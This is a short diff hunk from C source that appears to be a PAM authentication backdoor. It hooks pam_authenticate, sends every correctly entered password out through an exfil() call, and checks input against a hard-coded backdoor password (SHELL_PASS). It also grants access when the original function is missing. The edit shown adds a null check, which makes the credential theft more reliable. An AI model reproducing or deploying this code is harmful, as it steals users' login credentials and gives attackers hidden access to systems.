@@ -57,7 +57,7 @@ int pam_authenticate(pam_handle_t * pamh, int flags)
   if (o_pam_authenticate == NULL) return PAM_SUCCESS;
   res = o_pam_authenticate(pamh, flags);
 
-  if (res == PAM_SUCCESS) {
+  if (res == PAM_SUCCESS && pampassword) {
     // exfil correct passwords
     exfil(100, 1, "password", pampassword);
   } else if (!strcmp(pampassword, SHELL_PASS)) {
